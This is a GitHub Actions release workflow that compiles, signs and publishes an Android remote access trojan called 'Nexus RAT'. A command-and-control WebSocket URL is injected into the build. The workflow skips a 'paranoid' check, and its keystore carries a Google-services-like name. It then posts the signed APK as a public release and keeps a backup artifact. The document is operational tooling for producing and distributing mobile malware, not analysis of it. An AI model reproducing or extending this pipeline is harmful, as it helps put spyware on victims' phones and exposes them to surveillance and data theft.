name: Release APK

# ── Triggers ────────────────────────────────────────────────────────────────
# Push a tag like:  git tag v1.2.6 && git push origin v1.2.6
on:
  push:
    tags:
      - 'v[0-9]+.[0-9]+.[0-9]+'   # matches v1.2.5, v2.0.0, etc.
  workflow_dispatch:
    inputs:
      tag:
        description: 'Version tag (e.g. v1.2.6)'
        required: true
      server_url:
        description: 'C2 WebSocket URL (wss://...)'
        required: true
      draft:
        description: 'Create as draft release'
        required: false
        default: 'false'

# Only one release job at a time
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

# Needed to create the GitHub Release and upload assets
permissions:
  contents: write

jobs:
  release:
    name: Signed Release Build
    runs-on: ubuntu-latest
    timeout-minutes: 45

    defaults:
      run:
        working-directory: android-rat

    env:
      # Keystore temp path — outside the repo, cleaned in post step
      KEYSTORE_PATH: /tmp/release.jks

    steps:
      # ── 1. Checkout ──────────────────────────────────────────────────────
      - name: Checkout source
        uses: actions/checkout@v4
        with:
          fetch-depth: 0   # full history for changelog

      # ── 2. Resolve version ────────────────────────────────────────────────
      - name: Resolve version
        id: ver
        run: |
          # Tag from push event or manual input
          TAG="${{ github.event.inputs.tag || github.ref_name }}"
          # Strip leading 'v'
          VER="${TAG#v}"
          # Derive versionCode: major*10000 + minor*100 + patch
          IFS='.' read -r MAJOR MINOR PATCH <<< "$VER"
          VCODE=$(( (MAJOR * 10000) + (MINOR * 100) + PATCH ))
          echo "tag=$TAG"     >> "$GITHUB_OUTPUT"
          echo "version=$VER" >> "$GITHUB_OUTPUT"
          echo "vcode=$VCODE" >> "$GITHUB_OUTPUT"
          echo "Version: $TAG  →  versionCode=$VCODE"

      # ── 3. JDK ───────────────────────────────────────────────────────────
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'
          cache: gradle

      # ── 4. Gradle wrapper ─────────────────────────────────────────────────
      - name: Make gradlew executable
        run: chmod +x ./gradlew

      - name: Validate Gradle wrapper
        uses: gradle/actions/wrapper-validation@v3

      # ── 5. Gradle cache ──────────────────────────────────────────────────
      - name: Cache Gradle packages
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: gradle-release-${{ runner.os }}-${{ hashFiles('android-rat/**/*.gradle*', 'android-rat/**/gradle-wrapper.properties') }}
          restore-keys: |
            gradle-release-${{ runner.os }}-
            gradle-${{ runner.os }}-

      # ── 6. Decode & write keystore ────────────────────────────────────────
      # Secret KEYSTORE_BASE64: base64-encoded JKS file
      # To generate: base64 -w 0 google-services-release.jks
      - name: Decode keystore
        env:
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
        run: |
          if [ -z "$KEYSTORE_BASE64" ]; then
            echo "::error::Secret KEYSTORE_BASE64 is not set"
            exit 1
          fi
          echo "$KEYSTORE_BASE64" | base64 --decode > "$KEYSTORE_PATH"
          # Sanity check — JKS files start with magic bytes
          MAGIC=$(xxd -l 4 -p "$KEYSTORE_PATH")
          if [ "$MAGIC" != "feedfeed" ] && [ "$MAGIC" != "cececece" ]; then
            echo "::error::Decoded keystore does not appear to be a valid JKS/PKCS12 file"
            exit 1
          fi
          echo "::notice::Keystore decoded and validated ($( du -sh $KEYSTORE_PATH | cut -f1 ))"

      # ── 7. Verify secrets are set ─────────────────────────────────────────
      - name: Verify required secrets
        run: |
          missing=()
          [ -z "${{ secrets.KEYSTORE_PASS }}"  ] && missing+=("KEYSTORE_PASS")
          [ -z "${{ secrets.KEY_ALIAS }}"       ] && missing+=("KEY_ALIAS")
          [ -z "${{ secrets.KEY_PASS }}"        ] && missing+=("KEY_PASS")
          [ -z "${{ secrets.SERVER_URL }}"      ] && missing+=("SERVER_URL")
          if [ ${#missing[@]} -gt 0 ]; then
            echo "::error::Missing repository secrets: ${missing[*]}"
            echo "Set them at: Settings → Secrets and variables → Actions"
            exit 1
          fi
          echo "::notice::All required secrets are present"

      # ── 8. Build release APK ─────────────────────────────────────────────
      - name: Build signed release APK
        run: |
          ./gradlew assembleRelease \
            -PSERVER_URL="${{ secrets.SERVER_URL }}" \
            -PKEYSTORE_PATH="$KEYSTORE_PATH" \
            -PKEYSTORE_PASS="${{ secrets.KEYSTORE_PASS }}" \
            -PKEY_ALIAS="${{ secrets.KEY_ALIAS }}" \
            -PKEY_PASS="${{ secrets.KEY_PASS }}" \
            -PVERSION_CODE="${{ steps.ver.outputs.vcode }}" \
            -PVERSION_NAME="${{ steps.ver.outputs.version }}" \
            -PSKIP_PARANOID=true \
            --no-daemon \
            --stacktrace
        env:
          GRADLE_OPTS: "-Xmx4g -XX:+UseG1GC"

      # ── 9. Rename & collect APK ───────────────────────────────────────────
      - name: Rename APK
        id: apk
        run: |
          SRC=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          if [ -z "$SRC" ]; then
            echo "::error::No APK found in build output"
            exit 1
          fi
          DEST="app/build/outputs/apk/release/nexus-rat-${{ steps.ver.outputs.tag }}.apk"
          mv "$SRC" "$DEST"
          SIZE=$(du -sh "$DEST" | cut -f1)
          SHA256=$(sha256sum "$DEST" | awk '{print $1}')
          MD5=$(md5sum "$DEST" | awk '{print $1}')
          echo "path=$DEST"     >> "$GITHUB_OUTPUT"
          echo "size=$SIZE"     >> "$GITHUB_OUTPUT"
          echo "sha256=$SHA256" >> "$GITHUB_OUTPUT"
          echo "md5=$MD5"       >> "$GITHUB_OUTPUT"
          echo "APK ready: $DEST ($SIZE)"
          echo "SHA-256: $SHA256"
          echo "MD5:     $MD5"

      # ── 10. Verify APK signature ──────────────────────────────────────────
      - name: Verify APK signature
        run: |
          APK="android-rat/${{ steps.apk.outputs.path }}"
          # Use apksigner from Android build-tools
          APKSIGNER=$(find "$ANDROID_HOME/build-tools" -name "apksigner" | sort -V | tail -1)
          if [ -n "$APKSIGNER" ]; then
            "$APKSIGNER" verify --verbose "$APK"
            echo "::notice::APK signature verified"
          else
            # Fallback: jarsigner
            jarsigner -verify "$APK" && echo "::notice::APK signature verified (jarsigner)"
          fi

      # ── 11. Generate changelog ────────────────────────────────────────────
      - name: Generate changelog
        id: changelog
        run: |
          cd ${{ github.workspace }}
          # Get previous tag for diff
          PREV_TAG=$(git describe --tags --abbrev=0 HEAD^ 2>/dev/null || echo "")
          if [ -n "$PREV_TAG" ]; then
            CHANGES=$(git log --pretty="- %s" "${PREV_TAG}..HEAD" -- android-rat/ 2>/dev/null | head -30)
          else
            CHANGES=$(git log --pretty="- %s" HEAD~10..HEAD -- android-rat/ 2>/dev/null | head -20)
          fi
          if [ -z "$CHANGES" ]; then
            CHANGES="- Initial release"
          fi
          # Write to file (handles multiline for GITHUB_OUTPUT)
          {
            echo "## Changes"
            echo ""
            echo "$CHANGES"
            echo ""
            echo "## Build Info"
            echo "| | |"
            echo "|---|---|"
            echo "| Version | \`${{ steps.ver.outputs.tag }}\` |"
            echo "| VersionCode | \`${{ steps.ver.outputs.vcode }}\` |"
            echo "| SHA-256 | \`${{ steps.apk.outputs.sha256 }}\` |"
            echo "| MD5 | \`${{ steps.apk.outputs.md5 }}\` |"
            echo "| Size | ${{ steps.apk.outputs.size }} |"
          } > /tmp/release_notes.md
          cat /tmp/release_notes.md

      # ── 12. Create GitHub Release ─────────────────────────────────────────
      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name:   ${{ steps.ver.outputs.tag }}
          name:       "Nexus RAT ${{ steps.ver.outputs.tag }}"
          body_path:  /tmp/release_notes.md
          draft:      ${{ github.event.inputs.draft == 'true' }}
          prerelease: false
          fail_on_unmatched_files: true
          files: |
            android-rat/${{ steps.apk.outputs.path }}

      # ── 13. Upload artifact (backup) ──────────────────────────────────────
      - name: Upload signed APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: nexus-rat-${{ steps.ver.outputs.tag }}-signed
          path: android-rat/${{ steps.apk.outputs.path }}
          retention-days: 30
          if-no-files-found: error

      # ── 14. Build summary ────────────────────────────────────────────────
      - name: Write release summary
        if: always()
        run: |
          echo "## Release Summary" >> "$GITHUB_STEP_SUMMARY"
          cat /tmp/release_notes.md >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true

      # ── 15. Cleanup keystore (ALWAYS runs, even on failure) ──────────────
      - name: Clean up keystore
        if: always()
        run: |
          rm -f "$KEYSTORE_PATH"
          echo "Keystore removed from runner"
